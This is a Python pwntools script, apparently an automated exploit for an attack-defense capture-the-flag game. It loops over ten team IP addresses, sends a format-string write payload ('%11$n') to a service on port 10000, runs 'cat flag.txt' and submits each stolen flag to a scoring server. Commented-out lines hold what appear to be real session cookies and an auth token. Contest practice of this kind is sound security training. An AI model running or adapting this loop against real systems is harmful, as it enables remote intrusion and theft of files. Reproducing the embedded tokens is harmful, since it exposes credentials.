import sys
from pwn import *
# context.log_level='debug'
import requests
def submit_flag(flag):
    # cookies = {
    #     'PVEAuthCookie':'PVE:root@pam:5E92DFB1::hNh7AIUunuHhcwAT9bGhcDz2v8ft/e1p0bDPWnXweTDrUNTF8Bm8PR5lFrhYiuw8qiDLJEP0xifWF1tSe4QcOAFSpy9gaAuLLsXLgtzkiGwmMJLLdtO6dGSbRJWKkivzMC9FCIuYyiHsOc3qe7nFxgPA5+c3PDYcnrQMxlbiRHJlq2lPx6xYke4GauczteiE1fveEKD50IdSUvR/vV9x3EHcRd4dd05GYkQm9WLPZ8bUiJSwdWJC1pvAm4z3HjO7A4YwWsq7KOXlMwF7UZ2jBWBHmYVLEyaIjLGDZ1tcXV6YF/nAnLBhJkRZPmtq6qNyLWckbL+1nk+e7XbJQw0Iuw==',
    #     'csrftoken':'YkpaO179PzxRu31Uk5peOd7J1In9wDoPGmE6RYIFFPVezT3KtCnxt84PR27qPKIn',
    #     'sessionid':'szdvb86a94itzq1swg9d47w0r7llm379',
    # }

    # headers = {
    #     'Proxy-Connection': 'keep-alive',
    #     'Accept': '*/*',
    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
    #     'Content-Type': 'application/json',
    #     'Origin': 'http://39.100.119.37:8000',
    #     'Referer': 'http://39.100.119.37:8000/challenges',
    #     'Accept-Encoding': 'gzip, deflate',
    #     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6',
    #     'X-Requested-With': 'XMLHttpRequest',
    # }
    response = requests.get('https://192.168.31.100/a/1f2aced8-b017-4582-b3d9-c50c9590daff/'+flag, verify=False)
    print (response.text)
#context.arch='amd64'
ll=[
'192.168.31.11',
'192.168.31.12',
'192.168.31.13',
'192.168.31.14',
'192.168.31.15',
'192.168.31.16',
'192.168.31.17',
'192.168.31.18',
'192.168.31.19',
'192.168.31.20'
]
i=0
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./fm')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./fm')
			#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			if i == 10:
				i=0
			io=remote(ll[i],10000)
			elf=ELF('./fm')
			#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

		


		io.send(p32(0x0804A02C)+'%11$n')
		sleep(0.01)
		io.sendline('cat flag.txt')
		data=io.recvline()
		if '-' in data :
			print data
			submit_flag(data)


		# gdb.attach(io)
		# pause()
		# io.interactive()

	except Exception as e:
		io.close()
		i+=1
		continue
	else:
		io.close()
		i+=1
		continue